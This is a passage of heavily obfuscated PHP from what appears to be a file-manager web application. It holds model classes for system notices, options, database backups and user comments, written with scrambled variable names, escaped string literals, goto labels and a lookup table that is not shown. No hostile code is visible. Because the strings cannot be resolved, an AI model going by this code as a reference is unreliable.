$_SERVER[¤·²È‰º][174], $_SERVER[¤·²È‰º][781]); $ÚûìÍóÛ = !1; break; } } $Ó¶Ö ÎÅ = $µìÚ¢üË[$_SERVER[¤·²È‰º][476]]; $õ©»üŒè += 1; $à°†Ş += $µìÚ¢üË[$_SERVER[¤·²È‰º][86]]; $ûŒ¨“ÔÈ += 1; $ïñõ½¡” += $µìÚ¢üË[$_SERVER[¤·²È‰º][86]]; if ($à°†Ş >= 1024 * 1024 * 100) { $õ•éîä— = array($_SERVER[¤·²È‰º][821] => $Ó¶Ö ÎÅ, $_SERVER[¤·²È‰º][822] => $ûŒ¨“ÔÈ, $_SERVER[¤·²È‰º][823] => $ïñõ½¡”); Backup::set($õ•éîä—); $à°†Ş = $õ©»üŒè = 0; } } $†²°Üù– = count($Ğä¶œ); $ô°Ó¥¾++; } while ($†²°Üù– == $ï–‰œ¢€); $êœª‹‹á->end(); $õ•éîä— = array($_SERVER[¤·²È‰º][824] => 1, $_SERVER[¤·²È‰º][505] => time(), $_SERVER[¤·²È‰º][776] => 1, $_SERVER[¤·²È‰º][821] => $Ó¶Ö ÎÅ, $_SERVER[¤·²È‰º][813] => $¬­¤ğ³‚, $_SERVER[¤·²È‰º][812] => $Öš™ŒÃ, $_SERVER[¤·²È‰º][825] => time()); if ($õ©»üŒè) { $õ•éîä—[$_SERVER[¤·²È‰º][822]] = $ûŒ¨“ÔÈ; $õ•éîä—[$_SERVER[¤·²È‰º][823]] = $ïñõ½¡”; } Backup::set($õ•éîä—); $this->_fileFilter($ÃÈİ¶Øª); return !0; } private function _fileExist($­Úüªóò, &$Áıç×‰Ñ, $Ïñµ½‹¨) { $Ä «‡«Å =& $_SERVER[¤·²È‰º]; $é¥æä§ñ = $­Úüªóò[$Ä «‡«Å[94]]; if (in_array($­Úüªóò[$Ä «‡«Å[476]], $Áıç×‰Ñ)) { return !1; } if (!in_array($­Úüªóò[$Ä «‡«Å[818]], $Ïñµ½‹¨)) { return !1; } if (IO::exist($é¥æä§ñ)) { return !0; } $óâ´“…Ô = get_path_father($é¥æä§ñ); if (IO::exist($óâ´“…Ô)) { $Áıç×‰Ñ[] = $­Úüªóò[$Ä «‡«Å[476]]; return !1; } $‡ÈüÄ« = array($Ä «‡«Å[818] => $­Úüªóò[$Ä «‡«Å[818]], $Ä «‡«Å[94] => array($Ä «‡«Å[391], "{$óâ´“…Ô}\x25")); $Ìƒ‘ó…’ = Model($Ä «‡«Å[790])->where($‡ÈüÄ«)->field($Ä «‡«Å[477])->select(); $Áıç×‰Ñ = array_merge($Áıç×‰Ñ, array_to_keyvalue($Ìƒ‘ó…’, $Ä «‡«Å[12], $Ä «‡«Å[476])); return !1; } private function _fileFilter($Ôñ¤åºî) { $õ¡‹ÁòĞ =& $_SERVER[¤·²È‰º]; if (empty($Ôñ¤åºî)) { return; } $Ïº§ş¨° = array($õ¡‹ÁòĞ[476] => array($õ¡‹ÁòĞ[7], array_unique($Ôñ¤åºî))); $˜•óğ¼ã = Model($õ¡‹ÁòĞ[826])->where($Ïº§ş¨°)->field($õ¡‹ÁòĞ[410])->select(); foreach ($˜•óğ¼ã as $‘Ÿ»º“¤) { Model($õ¡‹ÁòĞ[826])->remove($‘Ÿ»º“¤[$õ¡‹ÁòĞ[410]], !1); } } private function storeIds() { $°™£×°Ò =& $_SERVER[¤·²È‰º]; $«Ã¢¦ = Model($°™£×°Ò[768])->listData(); $ç„ƒŠÙ = array(); $æÊÙÌÃØ = $GLOBALS[$°™£×°Ò[6]][$°™£×°Ò[99]][$°™£×°Ò[827]]; foreach ($«Ã¢¦ as $šÙ‚ä¤Î) { $ˆã‹Ÿë¯ = strtolower($šÙ‚ä¤Î[$°™£×°Ò[105]]); if (!isset($æÊÙÌÃØ[$ˆã‹Ÿë¯])) { continue; } $¼ãƒéÂË = $°™£×°Ò[84] . (isset($æÊÙÌÃØ[$ˆã‹Ÿë¯]) ? $æÊÙÌÃØ[$ˆã‹Ÿë¯] : ucfirst($ˆã‹Ÿë¯)); if (!class_exists($¼ãƒéÂË)) { continue; } $ç„ƒŠÙ[] = $šÙ‚ä¤Î[$°™£×°Ò[407]]; } return $ç„ƒŠÙ; } } goto bçô¼àò¼; C§ò“ŠÍ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\156\157\x74\x69\x63\145\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\143\x6f\156\164\145\x6e\164", "\x61\165\164\x68", "\155\x6f\144\x65", "\x74\151\x6d\145", "\164\x79\x70\145", "\x6c\145\166\x65\x6c", "\x65\156\x61\142\154\145", "\163\157\162\164"); public function listData($ˆÈ¨“Ğ = false, $Ø¾û– = "\x73\x6f\x72\164", $äğŞÛç÷ = false) { return parent::listData($ˆÈ¨“Ğ, $Ø¾û–, $äğŞÛç÷); } public function add($×ÅØšĞö) { $Ò¿ıÏ†î =& $_SERVER[¤·²È‰º]; $â‰¯íö¨ = time(); if ($×ÅØšĞö[$Ò¿ıÏ†î[26]] == $Ò¿ıÏ†î[2252]) { $â‰¯íö¨ = strtotime($×ÅØšĞö[$Ò¿ıÏ†î[213]]); } $×ÅØšĞö[$Ò¿ıÏ†î[213]] = $â‰¯íö¨; return parent::insert($×ÅØšĞö); } public function update($ê¦ÛÖÁ, $¦—¶Òèí) { $Å÷õî³¼ =& $_SERVER[¤·²È‰º]; $Ê†âÊÀ¹ = $this->listData($ê¦ÛÖÁ); if (!$Ê†âÊÀ¹) { return !1; } $–í®—Òµ = time(); if ($¦—¶Òèí[$Å÷õî³¼[26]] == $Å÷õî³¼[2252]) { $–í®—Òµ = strtotime($¦—¶Òèí[$Å÷õî³¼[213]]); } $¦—¶Òèí[$Å÷õî³¼[213]] = $–í®—Òµ; return parent::update($ê¦ÛÖÁ, $¦—¶Òèí); } public function remove($Û½àÇƒ«) { $éªğ®¶â = $this->listData($Û½àÇƒ«); if (!$éªğ®¶â || $éªğ®¶â[$_SERVER[¤·²È‰º][1270]]) { return !1; } return parent::remove($Û½àÇƒ«); } public function sort($ïÚİº›, $îİé¸Î½) { return parent::update($ïÚİº›, $îİé¸Î½); } public function enable($Ö¤®³â‰, $ìÓ³¿µ¥) { return parent::update($Ö¤®³â‰, array($_SERVER[¤·²È‰º][2253] => $ìÓ³¿µ¥)); } private function initUserOption() { $ÚÚä¯¹ã =& $_SERVER[¤·²È‰º]; $this->optionType = $ÚÚä¯¹ã[2254]; $this->modelType = $ÚÚä¯¹ã[2255]; $this->field = array($ÚÚä¯¹ã[2256], $ÚÚä¯¹ã[42], $ÚÚä¯¹ã[213], $ÚÚä¯¹ã[43], $ÚÚä¯¹ã[2257], $ÚÚä¯¹ã[751], $ÚÚä¯¹ã[205]); } public function userNoticeGet($¦Ë…ÆÙÂ = false) { $this->initUserOption(); return parent::listData($¦Ë…ÆÙÂ, $_SERVER[¤·²È‰º][407], !0); } public function userNoticeAdd($©­Œ™ïÀ) { $¸«®Ü„Ï =& $_SERVER[¤·²È‰º]; $this->initUserOption(); $üÔ¦À› = $this->findByKey($¸«®Ü„Ï[2256], $©­Œ™ïÀ[$¸«®Ü„Ï[407]]); if ($üÔ¦À›) { return !0; } $€Öøï›Å = array($¸«®Ü„Ï[2256] => $©­Œ™ïÀ[$¸«®Ü„Ï[407]], $¸«®Ü„Ï[42] => $©­Œ™ïÀ[$¸«®Ü„Ï[42]], $¸«®Ü„Ï[213] => $©­Œ™ïÀ[$¸«®Ü„Ï[213]], $¸«®Ü„Ï[43] => isset($©­Œ™ïÀ[$¸«®Ü„Ï[43]]) ? $©­Œ™ïÀ[$¸«®Ü„Ï[43]] : 1, $¸«®Ü„Ï[2257] => isset($©­Œ™ïÀ[$¸«®Ü„Ï[2257]]) ? $©­Œ™ïÀ[$¸«®Ü„Ï[2257]] : 0, $¸«®Ü„Ï[751] => 0, $¸«®Ü„Ï[205] => 0); return parent::insert($€Öøï›Å); } public function userNoticeEdit($€İçáõà, $§áÖñ–ä) { $this->initUserOption(); return parent::update($€İçáõà, $§áÖñ–ä); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\155\137\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\x6f\154\145", "\x72\x6f\x6c\x65\x47\x72\157\x75\160", "\162\x65\147\151\163\164", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($øÕŸ«Úî) { return "\123\171\x73\x74\145\155\117\x70\x74\x69\x6f\156\x5f{$øÕŸ«Úî}"; } protected function optionDefault($¥Ä§ÍÇ˜ = '') { $¦î–¯ª =& $_SERVER[¤·²È‰º]; if ($¥Ä§ÍÇ˜ == $¦î–¯ª[12]) { return $GLOBALS[$¦î–¯ª[6]][$¦î–¯ª[389]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Dˆèà ³ëÇ; FçóğÄ¥âö: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\142\x61\x63\x6b\165\x70\x4c\151\163\x74"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\x73\164\x61\x74\165\x73", "\x63\x6f\156\x74\145\x6e\164", "\155\x61\156\165\x61\x6c", "\x72\x65\163\165\154\x74", "\x74\151\155\145\x46\x72\157\x6d", "\x74\151\x6d\145\x54\157"); public function config() { $Ë¬ãğËÜ =& $_SERVER[¤·²È‰º]; $«€ûé•œ = Model($Ë¬ãğËÜ[771])->get($Ë¬ãğËÜ[781]); $«€ûé•œ = json_decode($«€ûé•œ, !0); $«€ûé•œ = is_array($«€ûé•œ) ? $«€ûé•œ : array(); if (!isset($«€ûé•œ[$Ë¬ãğËÜ[756]])) { $«€ûé•œ[$Ë¬ãğËÜ[756]] = $Ë¬ãğËÜ[98]; } unset($«€ûé•œ[$Ë¬ãğËÜ[1621]]); Action($Ë¬ãğËÜ[1848])->taskInit(); Model($Ë¬ãğËÜ[1620])->cacheClear(); $æìªûÖì = $Ë¬ãğËÜ[1849]; $×†÷åúÕ = Model($Ë¬ãğËÜ[1850])->findByKey($Ë¬ãğËÜ[1639], $æìªûÖì); if (!$×†÷åúÕ) { $×†÷åúÕ = array(); } if (isset($×†÷åúÕ[$Ë¬ãğËÜ[213]])) { $×†÷åúÕ[$Ë¬ãğËÜ[213]] = json_decode($×†÷åúÕ[$Ë¬ãğËÜ[213]], !0); } if (isset($«€ûé•œ[$Ë¬ãğËÜ[213]])) { $×†÷åúÕ[$Ë¬ãğËÜ[213]][$Ë¬ãğËÜ[1624]] = $«€ûé•œ[$Ë¬ãğËÜ[213]]; unset($«€ûé•œ[$Ë¬ãğËÜ[213]]); } return array_merge($×†÷åúÕ, $«€ûé•œ); } public function listData($äšÒŞª„ = false, $®ˆÁñê = "\x6d\x6f\144\x69\146\171\124\x69\155\x65", $»Ë¢¸•ï = false) { return parent::listData($äšÒŞª„, $®ˆÁñê, !0); } public function lastItem() { $á”óò¥† = $this->listData(); return !empty($á”óò¥†[0]) ? $á”óò¥†[0] : null; } public function kill($Ê¿”¬ªÏ) { $‡üî©¹Ÿ =& $_SERVER[¤·²È‰º]; $Ğ¾áå–­ = $this->listData($Ê¿”¬ªÏ); if (!$Ğ¾áå–­ || empty($Ğ¾áå–­[$‡üî©¹Ÿ[42]])) { return !0; } Task::kill($‡üî©¹Ÿ[780]); Task::kill($‡üî©¹Ÿ[801]); Task::kill($‡üî©¹Ÿ[810]); $Â†ìù˜ = $Ğ¾áå–­[$‡üî©¹Ÿ[42]]; $È†Ò¢ğç = TEMP_FILES . $‡üî©¹Ÿ[779] . $Â†ìù˜ . $‡üî©¹Ÿ[8]; IO::remove($È†Ò¢ğç, !1); return $this->remove($Ê¿”¬ªÏ); } public function remove($‘ÉæÔ¬ı) { $§òŒÑï³ = $this->listData($‘ÉæÔ¬ı); if (!$§òŒÑï³) { return !0; } return $this->backupRemove($§òŒÑï³); } private function backupRemove($¦ğ†ğ‘¤) { parent::remove($¦ğ†ğ‘¤[$_SERVER[¤·²È‰º][407]]); $áËå³¸€ = $this->backupPath($¦ğ†ğ‘¤); IO::remove($áËå³¸€, !1); return !0; } private function backupPath($¿Æ¨ğóÆ) { $ÊŸ¥ÌÈº =& $_SERVER[¤·²È‰º]; $ø€•Ï = $¿Æ¨ğóÆ[$ÊŸ¥ÌÈº[42]]; $ñöĞ×¶Ğ = Model($ÊŸ¥ÌÈº[771])->get($ÊŸ¥ÌÈº[772]); $ŒÜËŞÎ­ = substr(md5($ÊŸ¥ÌÈº[773] . $ñöĞ×¶Ğ . $ø€•Ï), 0, 8); return "\173\151\x6f\72{$¿Æ¨ğóÆ[$ÊŸ¥ÌÈº[753]]}\x7d\x2f\144\x61\164\141\142\x61\x73\x65\x2f\142\x61\143\x6b\165\x70\x2f" . $ø€•Ï . $ÊŸ¥ÌÈº[11] . $ŒÜËŞÎ­; } public function start() { $ÔïÎú…º =& $_SERVER[¤·²È‰º]; if ($GLOBALS[$ÔïÎú…º[6]][$ÔïÎú…º[99]][$ÔïÎú…º[1851]] != $ÔïÎú…º[98]) { return !0; } $’Ò–¿ = $this->config(); if (!$’Ò–¿ || $’Ò–¿[$ÔïÎú…º[1621]] != $ÔïÎú…º[98]) { return !1; } $ÅìÏâÕ = $this->process(); foreach ($ÅìÏâÕ as $õõÜÄ) { if ($õõÜÄ) { return Task::restart($õõÜÄ[$ÔïÎú…º[407]]); } } $¸›úõ¢÷ = new Backup(); $ª›­¤Ù£ = $¸›úõ¢÷->db(); if ($ª›­¤Ù£) { $ª›­¤Ù£ = $¸›úõ¢÷->dbFile(); if ($ª›­¤Ù£ && $’Ò–¿[$ÔïÎú…º[756]] == $ÔïÎú…º[207]) { $ª›­¤Ù£ = $¸›úõ¢÷->file(); } } Backup::set(array($ÔïÎú…º[751] => 1, $ÔïÎú…º[505] => time())); return !0; } public function process() { $øùøªËŠ =& $_SERVER[¤·²È‰º]; $ÓÂú„¦¬ = array($øùøªËŠ[759] => Task::get($øùøªËŠ[780]), $øùøªËŠ[763] => Task::get($øùøªËŠ[801]), $øùøªËŠ[209] => Task::get($øùøªËŠ[810])); $–Ğ¾¢¾™ = !1; foreach ($ÓÂú„¦¬ as &$äÇ­ˆ•«) { if ($–Ğ¾¢¾™) { $äÇ­ˆ•« = !1; continue; } if ($äÇ­ˆ•«) { $†Ï‡À¹« = intval(_get($äÇ­ˆ•«, $øùøªËŠ[1656], 0)); if (time() - $†Ï‡À¹« > 7200) { Task::kill($äÇ­ˆ•«[$øùøªËŠ[407]]); $–Ğ¾¢¾™ = !0; $äÇ­ˆ•« = !1; } } } return $ÓÂú„¦¬; } public function restore() { $şêæŸ¢„ =& $_SERVER[¤·²È‰º]; ActionCall($şêæŸ¢„[1054], !0, 1); ActionCall($şêæŸ¢„[1054], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\x6d\145" => "\143\x6f\155\155\145\x6e\x74\x5f\155\145\x74\x61", "\x6d\x65\164\141\x46\151\x65\x6c\144" => "\143\x6f\155\155\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ú˜–¶œÔ) { $ÀÑïôµù =& $_SERVER[¤·²È‰º]; if ($ú˜–¶œÔ[$ÀÑïôµù[1852]]) { $«¨ê˜— = $this->where(array($ÀÑïôµù[1853] => $ú˜–¶œÔ[$ÀÑïôµù[1852]]))->find(); if (!$«¨ê˜— || $«¨ê˜—[$ÀÑïôµù[419]] != $ú˜–¶œÔ[$ÀÑïôµù[419]] || $«¨ê˜—[$ÀÑïôµù[513]] != $ú˜–¶œÔ[$ÀÑïôµù[513]]) { return !1; } $this->where(array($ÀÑïôµù[1853] => $ú˜–¶œÔ[$ÀÑïôµù[1852]]))->setAdd($ÀÑïôµù[1854], 1); } $ú˜–¶œÔ[$ÀÑïôµù[1855]] = 0; $ú˜–¶œÔ[$ÀÑïôµù[1854]] = 0; $ú˜–¶œÔ[$ÀÑïôµù[751]] = 1; return $this->add($ú˜–¶œÔ); } public function commentCount($£Æ§ã§‹, $éêÈÁˆ£, $•Ÿ°…ã = false) { $Ù¡›È‹ =& $_SERVER[¤·²È‰º]; if (!$£Æ§ã§‹) { return array(); } if (is_string($£Æ§ã§‹) || is_int($£Æ§ã§‹)) { $£Æ§ã§‹ = array($£Æ§ã§‹); } $ŞÉÈ«Âö = array($Ù¡›È‹[513], $Ù¡›È‹[1856] => $Ù¡›È‹[508]); $Ÿ­¯à‚¼ = array($Ù¡›È‹[513] => array($Ù¡›È‹[7], $£Æ§ã§‹), $Ù¡›È‹[419] => $éêÈÁˆ£); if ($•Ÿ°…ã) { $Ÿ­¯à‚¼[$Ù¡›È‹[1651]] = $•Ÿ°…ã; } $ä¢Œ±Ãî = $this->field($ŞÉÈ«Âö)->where($Ÿ­¯à‚¼)->group($Ù¡›È‹[513])->select(); return array_to_keyvalue($ä¢Œ±Ãî, $Ù¡›È‹[513], $Ù¡›È‹[508]); } public function starTarget($í—Ğ¹§È, $¼Éáœ®») { $ïšÃ‰éä =& $_SERVER[¤·²È‰º]; $””ş£üù = $í—Ğ¹§È + self::TYPE_STAR_OFFSET; $Æœ®äß = array($ïšÃ‰éä[1651] => USER_ID, $ïšÃ‰éä[419] => $””ş£üù, $ïšÃ‰éä[513] => $¼Éáœ®»); $Õïİ›³© = $this->where($Æœ®äß)->find(); if ($Õïİ›³©) { return $this->where(array($ïšÃ‰éä[407] => $Õïİ›³©[$ïšÃ‰éä[407]]))->delete(); } $”²ØÍ§İ = array($ïšÃ‰éä[1852] => 0, $ïšÃ‰éä[1651] => USER_ID, $ïšÃ‰éä[751] => 1, $ïšÃ‰éä[756] => $ïšÃ‰éä[12], $ïšÃ‰éä[419] => $””ş£üù, $ïšÃ‰éä[513] => $¼Éáœ®», $ïšÃ‰éä[1855] => 0, $ïšÃ‰éä[1854] => 0); return $this->add($”²ØÍ§İ); } public function starTargetCount($ÈÛ³Ê­, $·ëÏª¾) { $ş•Íà¨™ =& $_SERVER[¤·²È‰º]; $¿Á×û¯í = $·ëÏª¾ + self::TYPE_STAR_OFFSET; $Õ§çÌ– = $this->commentCount($ÈÛ³Ê­, $¿Á×û¯í); $–†¹ê¥ó = $this->commentCount($ÈÛ³Ê­, $¿Á×û¯í, USER_ID); return array($ş•Íà¨™[1857] => $Õ§çÌ–, $ş•Íà¨™[1858] => $–†¹ê¥ó); } public function starTargetUserList($ùè´ı‡´, $á„ö¹ƒ€) { $‘„ô¯óæ =& $_SERVER[¤·²È‰º]; $‘ĞŒ×Ñ = $ùè´ı‡´ + self::TYPE_STAR_OFFSET; $Ë¬× = array($‘„ô¯óæ[513] => $á„ö¹ƒ€, $‘„ô¯óæ[419] => $‘ĞŒ×Ñ); $ÕÙöÃú“ = $this->where($Ë¬×)->count(); $ÎíÂó = array($‘„ô¯óæ[264] => $ÕÙöÃú“, $‘„ô¯óæ[1859] => array()); if (!$ÕÙöÃú“) { return $ÎíÂó; } $¤Ÿ–åÜú = $this->field($‘„ô¯óæ[1651])->where($Ë¬×)->limit(500)->select(); $¤Ÿ–åÜú = array_to_keyvalue($¤Ÿ–åÜú, $‘„ô¯óæ[12], $‘„ô¯óæ[1651]); $ÎíÂó[$‘„ô¯óæ[1859]] = Model($‘„ô¯óæ[521])->userListInfo($¤Ÿ–åÜú); return $ÎíÂó; } public function prasiseUserList($Úñ˜ïÙ) { $Œß¥ƒº =& $_SERVER[¤·²È‰º]; $Áİìöìê = array($Œß¥ƒº[1860] => $Úñ˜ïÙ); $öÇ¡¾®ô = $this->where($Áİìöìê)->find(); $à‹’‚´« = _get($öÇ¡¾®ô, $Œß¥ƒº[1855], 0); $î¯çŞ£Î = array($Œß¥ƒº[264] => $à‹’‚´«, $Œß¥ƒº[1859] => array()); if (!$à‹’‚´«) { return $î¯çŞ£Î; } $õÄÈçí® = Model($Œß¥ƒº[1861])->field($Œß¥ƒº[1651])->where($Áİìöìê)->limit(500)->select(); $õÄÈçí® = array_to_keyvalue($õÄÈçí®, $Œß¥ƒº[12], $Œß¥ƒº[1651]); $î¯çŞ£Î[$Œß¥ƒº[1859]] = Model($Œß¥ƒº[521])->userListInfo($õÄÈçí®); return $î¯çŞ£Î; } public function remove($´¾ ÷¯Ü) { $§Õ³“˜Ì =& $_SERVER[¤·²È‰º]; $ãÜÍš±¤ = array($§Õ³“˜Ì[1853] => $´¾ ÷¯Ü); $ü´¹Ÿ¾æ = $this->where($ãÜÍš±¤)->find(); if ($ü´¹Ÿ¾æ[$§Õ³“˜Ì[1852]]) { $this->where(array($§Õ³“˜Ì[1853] => $ü´¹Ÿ¾æ[$§Õ³“˜Ì[1852]]))->setAdd($§Õ³“˜Ì[1854], -1); } return $this->where($ãÜÍš±¤)->delete(); } public function edit($™şË’” , $™Ã¢®ÌÑ) { $–º»­ºÉ =& $_SERVER[¤·²È‰º]; $«Ã¥íçà = array($–º»­ºÉ[1853] => $™şË’” ); return $this->where($«Ã¥íçà)->save(array($–º»­ºÉ[1862] => $™Ã¢®ÌÑ)); } public function prasise($ÎÍ±Ÿ¦) { $œÉ’õ¹Ø =& $_SERVER[¤·²È‰º]; $ŠİàÖ“á = Model($œÉ’õ¹Ø[1863]); $¸ŒòÓõí = array($œÉ’õ¹Ø[1853] => $ÎÍ±Ÿ¦, $œÉ’õ¹Ø[1642] => USER_ID); $È„£œäù = $ŠİàÖ“á->where($¸ŒòÓõí)->find(); if (!$È„£œäù) { $ŠİàÖ“á->add($¸ŒòÓõí); $çÛ§¸¢ª = $this->where(array($œÉ’õ¹Ø[1853] => $ÎÍ±Ÿ¦))->setAdd($œÉ’õ¹Ø[1855], 1); } else { $ŠİàÖ“á->where($¸ŒòÓõí)->delete(); $çÛ§¸¢ª = $this->where(array($œÉ’õ¹Ø[1853] => $ÎÍ±Ÿ¦))->setAdd($œÉ’õ¹Ø[1855], -1); } return $çÛ§¸¢ª; } public function targetInfo($›ó›‡ŒÖ, $ŸïÈïÁ) { $«€‹‘ì’ =& $_SERVER[¤·²È‰º]; $ Ğ÷«Ì‹ = array($«€‹‘ì’[594] => $›ó›‡ŒÖ, $«€‹‘ì’[595] => $ŸïÈïÁ); $œÖôª²£ = $this->where($ Ğ÷«Ì‹)->count(); $‘ş×““ = "\122\111\107\110\x54\40\112\117\111\116\x20{$this->tablePrefix}\143\157\155\155\145\x6e\164\137\160\162\x61\x69\x73\x65\x20\x73\x74\x61\162\x20\x6f\x6e\40\143\x6f\x6d\155\x65\156\164\56\x63\157\155\155\145\x6e\x74\x49\104\40\75\40\163\x74\x61\162\56\x63\157\x6d\155\145\156\x74\x49\104"; $‘³å®ª = $this->alias($«€‹‘ì’[363])->where($ Ğ÷«Ì‹)->join($‘ş×““, $«€‹‘ì’[1864])->count(); $İ«ğ¿‚¹ = array($«€‹‘ì’[1865] => $œÖôª²£, $«€‹‘ì’[1866] => $‘³å®ª); return $İ«ğ¿‚¹; } public function listData($“¡ğãã) { $–üÉŞßˆ =& $_SERVER[¤·²È‰º]; if (isset($“¡ğãã[$–üÉŞßˆ[1867]])) { if ($“¡ğãã[$–üÉŞßˆ[1867]]) { $“¡ğãã[$–üÉŞßˆ[1860]] = array($–üÉŞßˆ[1008], intval($“¡ğãã[$–üÉŞßˆ[1867]])); } unset($“¡ğãã[$–üÉŞßˆ[1867]]); } if (isset($“¡ğãã[$–üÉŞßˆ[1868]])) { if ($“¡ğãã[$–üÉŞßˆ[1868]]) { $“¡ğãã[$–üÉŞßˆ[1860]] = array($–üÉŞßˆ[1005], intval($“¡ğãã[$–üÉŞßˆ[1868]])); } unset($“¡ğãã[$–üÉŞßˆ[1868]]); } return $this->_listData($“¡ğãã); } private function _listData($ª÷ùµĞ³) { $óÌ³Í±Ï =& $_SERVER[¤·²È‰º]; $±†Ÿòª³ = $this->where($ª÷ùµĞ³)->_makeOrder()->selectPage(100); $this->_listAppendParent($±†Ÿòª³[$óÌ³Í±Ï[378]]); $this->_listAppendUser($±†Ÿòª³[$óÌ³Í±Ï[378]]); $this->_listAppendMeta($±†Ÿòª³[$óÌ³Í±Ï[378]]); return $±†Ÿòª³; } private function _makeOrder() { $ŞÈêÈ¢ò =& $_SERVER[¤·²È‰º]; $ëÅè¡ì© = array($ŞÈêÈ¢ò[1855], $ŞÈêÈ¢ò[1854], $ŞÈêÈ¢ò[210]); $…”²Â¨º = Input::get($ŞÈêÈ¢ò[465], $ŞÈêÈ¢ò[7], $ŞÈêÈ¢ò[431], $ëÅè¡ì©); $™Æ®ı‰Ë = Input::get($ŞÈêÈ¢ò[466], $ŞÈêÈ¢ò[7], $ŞÈêÈ¢ò[1644], array($ŞÈêÈ¢ò[1869], $ŞÈêÈ¢ò[461])); $¿œ Ùƒ = $…”²Â¨º . $ŞÈêÈ¢ò[63] . $™Æ®ı‰Ë; return $this->order($¿œ Ùƒ); } private function _listAppendParent(&$®à¤ä…Õ) { $–©«æ÷¤ =& $_SERVER[¤·²È‰º]; $ª÷õ˜Ê  = array_unique(array_to_keyvalue($®à¤ä…Õ, $–©«æ÷¤[12], $–©«æ÷¤[1852])); $ª÷õ˜Ê  = array_remove_value($ª÷õ˜Ê , $–©«æ÷¤[207]); if (!$ª÷õ˜Ê ) { return; } $ıó½ŒĞŒ = $this->where(array($–©«æ÷¤[1853] => array($–©«æ÷¤[7], $ª÷õ˜Ê )))->select(); $ıó½ŒĞŒ = array_to_keyvalue($ıó½ŒĞŒ, $–©«æ÷¤[1860]); foreach ($®à¤ä…Õ as &$¹»Æ˜é°) { if (isset($ıó½ŒĞŒ[$¹»Æ˜é°[$–©«æ÷¤[1852]]])) { $¹»Æ˜é°[$–©«æ÷¤[1870]] = $ıó½ŒĞŒ[$¹»Æ˜é°[$–©«æ÷¤[1852]]]; } } unset($¹»Æ˜é°); } private function _listAppendUser(&$Û†–¢íê) { $ñÏ¤ºâˆ =& $_SERVER[¤·²È‰º]; $”åù„ûÍ = array_unique(array_to_keyvalue($Û†–¢íê, $ñÏ¤ºâˆ[12], $ñÏ¤ºâˆ[1651])); $”åù„ûÍ = array_remove_value($”åù„ûÍ, $ñÏ¤ºâˆ[207]); if (count($”åù„ûÍ) == 0) { return; } foreach ($Û†–¢íê as $¯İñÕóÌ) { if (isset($¯İñÕóÌ[$ñÏ¤ºâˆ[1870]])) { $”åù„ûÍ[] = $¯İñÕóÌ[$ñÏ¤ºâˆ[1870]][$ñÏ¤ºâˆ[1651]]; } } $½—ªÏÎÛ = Model($ñÏ¤ºâˆ[543])->userListInfo($”åù„ûÍ); foreach ($Û†–¢íê as &$¯İñÕóÌ) { $¯İñÕóÌ[$ñÏ¤ºâˆ[608]] = $½—ªÏÎÛ[$¯İñÕóÌ[$ñÏ¤ºâˆ[1651]]]; if (isset($¯İñÕóÌ[$ñÏ¤ºâˆ[1870]])) { $¯İñÕóÌ[$ñÏ¤ºâˆ[1870]][$ñÏ¤ºâˆ[608]] = $½—ªÏÎÛ[$¯İñÕóÌ[$ñÏ¤ºâˆ[1870]][$ñÏ¤ºâˆ[1651]]]; } } unset($¯İñÕóÌ); } private function _listAppendMeta(&$Ã…­ı¸æ) { $®Éşş˜› =& $_SERVER[¤·²È‰º]; $­Çê¬áÏ = array_unique(array_to_keyvalue($Ã…­ı¸æ, $®Éşş˜›[12], $®Éşş˜›[1860])); $­Çê¬áÏ = array_remove_value($­Çê¬áÏ, $®Éşş˜›[207]); if (!$­Çê¬áÏ) { return; } foreach ($Ã…­ı¸æ as $¦òÖ—µ¿) { if (isset($¦òÖ—µ¿[$®Éşş˜›[1870]])) { $­Çê¬áÏ[] = $¦òÖ—µ¿[$®Éşş˜›[1870]][$®Éşş˜›[1860]]; } } $ˆã¤‘ãÅ = $this->metaList($­Çê¬áÏ); if (!$ˆã¤‘ãÅ) { return !1; } foreach ($Ã…­ı¸æ as &$¦òÖ—µ¿) { $¦òÖ—µ¿[$®Éşş˜›[474]] = $ˆã¤‘ãÅ[$¦òÖ—µ¿[$®Éşş˜›[1860]]]; if (isset($¦òÖ—µ¿[$®Éşş˜›[1870]])) { $¦òÖ—µ¿[$®Éşş˜›[1870]][$®Éşş˜›[474]] = $ˆã¤‘ãÅ[$¦òÖ—µ¿[$®Éşş˜›[1870]][$®Éşş˜›[1860]]]; } } unset($¦òÖ—µ¿); } private function metaList($èŞÉ¢¦ù) { $š×À¤å =& $_SERVER[¤·²È‰º]; if (!$èŞÉ¢¦ù) { return array(); } $ÄüËãö = array($š×À¤å[1860] => array($š×À¤å[7], $èŞÉ¢¦ù)); $Íª¬ÃŸõ = Model($š×À¤å[1871])->where($ÄüËãö)->select(); $Íª¬ÃŸõ = array_to_keyvalue_group($Íª¬ÃŸõ, $š×À¤å[1860]); foreach ($Íª¬ÃŸõ as $ğïÃ¢Á± => $®ñØÖÒÊ) { $½¯¤Ô™ = array(); foreach ($®ñØÖÒÊ as $¿ôƒØİ†) { $½¯¤Ô™[$¿ôƒØİ†[$š×À¤å[104]]] = $¿ôƒØİ†[$š×À¤å[383]]; } $Íª¬ÃŸõ[$ğïÃ¢Á±] = $½¯¤Ô™; } return $Íª¬ÃŸõ ? $Íª¬ÃŸõ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145\137\x63\157\156\164\x65\156\164\163"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\155\x65", 